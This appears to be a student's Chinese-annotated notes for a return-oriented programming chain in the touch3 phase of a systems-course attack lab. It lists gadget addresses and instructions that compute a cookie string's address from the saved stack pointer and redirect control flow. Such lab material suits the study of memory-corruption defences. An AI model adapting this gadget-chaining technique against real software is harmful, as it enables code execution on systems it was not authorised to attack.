<gadget2>->0x401aad
mov %rsp, %rax #rax保存初始栈顶
nop
ret

<gadget4>->0x4019a2
mov %rax, %rdi #rdi保存初始栈顶
ret

<gadget3>->0x4019cc
popq %rax # rax = x
nop
ret

<gadget5>->0x4019dd
mov %eax, %edx # edx = x
nop
ret

<gadget8>->0x401a34
mov %edx, %ecx # ecx = x
cmp %cl, %cl
ret

<gadget7>->0x401a27
mov %ecx, %esi # esi = x
cmp %al, %al
ret

<jmp to add_xy>->0x4019d6
%rax = %rdi + %rsi(初始栈顶 + x->cookie的首地址)
ret

<gadget4>->0x4019a2
mov %rax, %rdi #rdi保存cookie首地址
ret
<jmp to touch3>->0x4018fa